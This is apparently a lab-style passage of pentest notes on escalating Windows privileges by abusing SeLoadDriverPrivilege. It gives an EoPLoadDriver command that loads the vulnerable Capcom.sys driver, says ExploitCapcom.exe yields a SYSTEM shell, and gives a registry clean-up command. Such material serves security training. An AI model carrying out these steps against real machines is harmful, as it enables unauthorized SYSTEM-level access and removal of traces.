
```Note
Since Windows 10 Version 1803, the "SeLoadDriverPrivilege" is not exploitable, as it is no longer possible to include references to registry keys under "HKEY_CURRENT_USER".
```

---
## Exploitation

[SeLoadDriverPrivilege Exploit Resources](https://github.com/x1o3/SeLoadDriverPrivilege)

We can use [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the process of enabling the privilege, creating the registry key, and executing `NTLoadDriver` to load the driver.

```PowerShell
C:\htb> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

We can run `ExploitCapcom.exe` to pop a SYSTEM shell or run our custom binary.

---
## Clean-Up

```PowerShell
C:\htb> reg delete HKCU\System\CurrentControlSet\Capcom
### Cleaning registry key
```

---